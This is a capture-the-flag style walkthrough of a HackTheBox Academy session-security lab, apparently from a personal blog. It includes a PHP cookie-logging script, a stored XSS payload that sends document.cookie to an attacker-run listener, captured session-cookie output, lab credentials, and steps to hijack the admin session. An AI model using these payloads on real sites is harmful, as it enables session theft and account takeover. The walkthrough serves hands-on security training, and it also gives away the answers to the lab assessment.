---
title: "[HTB] Session Security"
excerpt: "**Session Security** Module Walkthrough - HackTheBox Academy"
header:
  overlay_image: /assets/images/HTB_Session_Security/banner.png
  teaser: /assets/images/HTB_Session_Security/upper.jpg
  og_image: /assets/images/HTB_Session_Security/upper.jpg
categories:
  - HTB-Academy
tags:
  - HTB-Academy
  - Bug Bounty Hunter
  - Penetration Tester
  - Web
  - OWASP TOP 10
  - Session Security
  - Cookie
  - PHP
  - Payload
layout: single
toc: true
---
![image-center](\assets\images\HTB_Session_Security\upper.jpg)

## Disclaimer
<img style="float: left; padding-right:10px" src="\assets\images\disclaimer.png" width="110" height="110">

<div style="text-align: justify">The following post may contain spoilers. Use it as a guide or support. It is always better to try it by yourself!</div>
<div style="text-align: justify">Enjoy :)</div>

## Resources
<img style="float: left; padding-right:10px" src="\assets\images\github.avif" width="110" height="110">
<div style="text-align: justify">All resources can be found in the following GitHub repository:</div>
[R4fik1-HTB_Session_Security_Repository](https://github.com/r4fik1/HTB_Academy/tree/main/HTB_Session_Security)

## Module Summary

Any inefficiencies or misconfigurations in the session-handling implementation of a web application, service, or API can have devastating consequences that range from information leakage and inadvertent user actions all the way to Account Takeover (ATO) and remote code execution.

As you can imagine, it is of paramount importance to thoroughly test the session-handling logic of a web application being assessed. That said, testing the robustness of a session-handling implementation is not a small feat. This is because chaining (seemingly unrelated) vulnerabilities is often required to successfully attack a user's session.

Worry not, though; in this module, we will provide you with a highly hands-on experience around attacking a user's session and the possible paths that you can take to achieve that.

In this module, you will have the opportunity to practice manual exploitation of the following:

- Session Hijacking
- Session Fixation
- XSS (Cross-Site Scripting) <-- With a focus on user sessions
- CSRF (Cross-Site Request Forgery)
- Open Redirect <-- With a focus on user sessions
  
We will also discuss remediation guidance regarding the abovementioned vulnerabilities.

## Session Security - Skills Assessment

>**Q. Read the flag residing in the admin's public profile. Answer format: [string]**

<div style="text-align: justify">1. We utilize virtual hosts (vhosts) to house the web applications to simulate a large, realistic environment with multiple webservers. Since these vhosts all map to a different directory on the same host, we have to make manual entries in our /etc/hosts file on the Pwnbox or local attack VM to interact with the lab.</div><br>
![image-center](\assets\images\HTB_Session_Security\Q11\1.png)

<div style="text-align: justify">2. Access to http://minilab.htb.net. First you have to log in with the credentials provided in the statement. Enter the credentials and click on login.</div>
```
Email: heavycat106
Password: rocknrol
```
![image-center](\assets\images\HTB_Session_Security\Q11\2.png)

<div style="text-align: justify">3. Create a PHP script that saves the cookie.</div>
```sh
nano log.php
```
```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>
```

![image-center](\assets\images\HTB_Session_Security\Q11\3.png)

<div style="text-align: justify">4. Open a listener in the same folder where the PHP script created in the previous step is.</div>
```sh
php -S 10.10.15.60:8000
```
![image-center](\assets\images\HTB_Session_Security\Q11\4.png)


<div style="text-align: justify">5. Access the "app" section, enter the following payload in the country field and click on the "Save" button.</div>
```php
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://10.10.15.60:8000/log.php?c=' + document.cookie;"></video>
```
![image-center](\assets\images\HTB_Session_Security\Q11\5.png)

<div style="text-align: justify">6. When you click on save, you are redirected to a section where you can save the data permanently. In the following screenshot it is verified that the app has accepted the payload. Click on Save.</div><br>
![image-center](\assets\images\HTB_Session_Security\Q11\6.png)

<div style="text-align: justify">7. Access "http://minilab.htb.net/submit-solution" and see how the success field is "false".</div><br>
![image-center](\assets\images\HTB_Session_Security\Q11\7.png)

<div style="text-align: justify">8. Insert the following link that contains the profile with the payload as a parameter.</div>
```
http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com
```
![image-center](\assets\images\HTB_Session_Security\Q11\8.png)

<div style="text-align: justify">9. We check the listener and see what looks like a cookie thanks to the payload, the script and the listener.</div><br>
```sh
[Thu Feb  9 11:11:28 2023] 10.129.19.198:37042 [302]: GET /log.php?c=auth-session=s%3AZMEqyRAhF2Ta7gHyxUZCWu4DaPb2_KT0.ES2ciTNMldjUBsKFonTFKF%2B09jHx6I3lIJFfQGjTkmc
```
![image-center](\assets\images\HTB_Session_Security\Q11\9.png)

<div style="text-align: justify">10. In chrome introduce that cookie in storage and update.</div><br>
![image-center](\assets\images\HTB_Session_Security\Q11\10.png)

<div style="text-align: justify">11. The admin profile has been accessed within the app. Click on the "Change Visibility" button.</div><br>
![image-center](\assets\images\HTB_Session_Security\Q11\11.png)
<div style="text-align: justify">12. Finally, click on "Make Public!" button.</div><br>
![image-center](\assets\images\HTB_Session_Security\Q11\12.png)
<div style="text-align: justify">13. Here we see the first flag and a button to get the second flag. Clicking on the "Flag2" button downloads a pcap file.</div><br>
![image-center](\assets\images\HTB_Session_Security\Q11\13.png)

>**Q. Go through the PCAP file residing in the admin's public profile and identify the flag. Answer format: FLAG{string}
wireshark**

<div style="text-align: justify">1. We open Wireshark as "superuser" and click on "Open Capture File". Select the previously downloaded file.</div><br>
![image-center](\assets\images\HTB_Session_Security\Q11\14.png)

<div style="text-align: justify">2. Once the file is open, we look for the string "FLAG" in the search engine and the second Flag is obtained.</div><br>
![image-center](\assets\images\HTB_Session_Security\Q11\15.png)